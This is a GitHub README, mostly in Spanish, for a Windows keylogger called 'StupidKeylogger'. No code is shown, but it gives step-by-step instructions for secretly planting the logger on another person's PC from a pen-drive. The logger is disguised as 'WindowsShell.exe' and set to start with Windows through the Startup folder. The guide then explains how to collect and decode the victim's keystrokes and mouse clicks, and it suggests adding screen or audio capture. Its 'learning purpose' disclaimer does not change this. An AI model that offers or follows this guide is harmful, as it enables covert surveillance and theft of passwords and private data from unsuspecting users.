<h1> <img src="https://cloud.githubusercontent.com/assets/5456665/22565016/e5cda4fc-e9b0-11e6-9d02-211b4a84c558.png" width="24" height=auto /> StupidKeylogger </h1>

[![Donate](https://img.shields.io/badge/Donate-PayPal-green.svg)](https://www.paypal.com/donate/?business=5KR6BA9MYTM62&no_recurring=0&currency_code=USD)

#### A Terrific Keystroke Recorder

This tacky program hides itself in the subject’s PC (Windows XP or later), and silently records all keyboard and mouse operations. It is launched automatically with PC start, then stores data in ASCII code with record-date. Now all you have to do is- collect the record, and decode it.

**This project is created only for learning purpose.**

### Como utilizarlo?

1. Descarga el paquete desde [aquí](https://github.com/MinhasKamal/StupidKeylogger/archive/application.zip), descomprímalo y muévalo a su pen-drive. Debería verse algo como esto-

 <div align="center">
   <img src="https://cloud.githubusercontent.com/assets/5456665/18231884/984f4d58-72e5-11e6-8401-725c6906c040.PNG" alt="StupidKeylogger"/>
 </div>

 **WindowsShell.exe** es la forma compilada y renombrada de [**Keylogger.cpp**](https://github.com/MinhasKamal/StupidKeylogger/blob/master/com/minhaskamal/stupidKeylogger/Keylogger.cpp). Por supuesto, no espera que otros le permitan insertar un pen-drive que contenga un registrador de teclas; ¡aunque sea una estupidez! **WindowsShell** es el archivo de enlace de **WindowsShell.exe**. 

2. Inserte su pen-drive en una computadora y ejecute **Infect.bat**. Esto instalara **WindowsShell.exe** (en la carpeta *%appdata%*) y **WindowsShell.lnk** (en *%appdata%\Microsoft\Windows\Start Menu\Programs\Startup*) en esa PC, e iniciarlo. 

3. Espere unos días (sé que es difícil pero tenga paciencia), luego regrese a la PC, inserte el pen-drive y ejecuta **CollectData.bat**. Obtendrá un archivo llamado **Record.log**. Esto es lo que contiene-

 <div align="center">
   <img src="https://cloud.githubusercontent.com/assets/5456665/20914395/89d6b268-bba9-11e6-9586-dae692aa0405.png" alt="Record" width="600px" height=auto />
 </div>

4. Ahora, simplemente ejecuta **RecordDecoder.exe** (mantén **Record.log** en la misma carpeta y no le cambies el nombre), y obtendras **Data.log**. Este archivo contiene todas las pulsaciones de teclas y clics del ratón. Ahora depende de usted encontrar la información necesaria de esto (¡buena suerte con eso!).

 <div align="center">
   <img src="https://cloud.githubusercontent.com/assets/5456665/20915077/d9e3ffbe-bbad-11e6-87f1-d7c079c3cfb7.png" alt="Data" width="600px" height=auto />
 </div>

 Deberias de usar [**RecordDecoderFocused**](https://github.com/MinhasKamal/StupidKeylogger/blob/master/com/minhaskamal/stupidKeylogger/RecordDecoderFocused.cpp) en vez de **RecordDecoder.exe**, se deshará de algunos datos innecesarios automáticamente para usted.

5. Si desea eliminar Keylogger de esa PC, ejecute **Cure.bat**.

Surely you can use it in many other ways; and also enhance its ability by adding a screen capturer, or sound recorder, and so on.

**Nota:** *No asumiré ninguna responsabilidad por los malos actos de otra persona con mi programa.*. Pero sí creo que un estudiante real aprenderá mucho de esto.

Esto es en realidad un anteproyecto para [TrojanCockroach](https://github.com/MinhasKamal/TrojanCockroach).

### Licencia
<a rel="license" href="https://opensource.org/licenses/MIT"><img alt="MIT License" src="https://cloud.githubusercontent.com/assets/5456665/18950087/fbe0681a-865f-11e6-9552-e59d038d5913.png" width="60em" height=auto/></a><br/><a href="https://github.com/MinhasKamal/StupidKeylogger">StupidKeylogger</a> is licensed under <a rel="license" href="https://opensource.org/licenses/MIT">MIT License</a>.
